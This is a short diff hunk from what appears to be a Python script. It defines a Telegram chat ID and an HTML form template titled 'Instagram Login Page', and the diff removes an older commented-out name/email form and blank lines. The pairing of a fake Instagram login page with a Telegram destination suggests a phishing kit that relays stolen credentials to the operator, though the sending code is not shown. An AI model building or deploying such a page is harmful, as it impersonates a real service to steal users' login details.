@@ -9,23 +9,6 @@ TELEGRAM_CHAT_ID = '5043961881'  # Replace with your actual Telegram chat ID
 
 # Define the form template
 form_template = """
-<!DOCTYPE html>
-# <html>
-# <head>
-#     <title>Telegram Form</title>
-# </head>
-# <body>
-#     <form id="telegramForm" action="/submit" method="post">
-#         <label for="name">Name:</label>
-#         <input type="text" id="name" name="name" required><br><br>
-
-#         <label for="email">Email:</label>
-#         <input type="email" id="email" name="email" required><br><br>
-
-#         <input type="submit" value="Submit">
-#     </form>
-# </body>
-# </html>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -34,13 +17,6 @@ form_template = """
 	<title>Instagram Login Page</title>
 	<link rel="stylesheet" href="styles.css">
 </head>
-
-
-
-
-
-
-
 <body>
 
 <div class="wrapper">
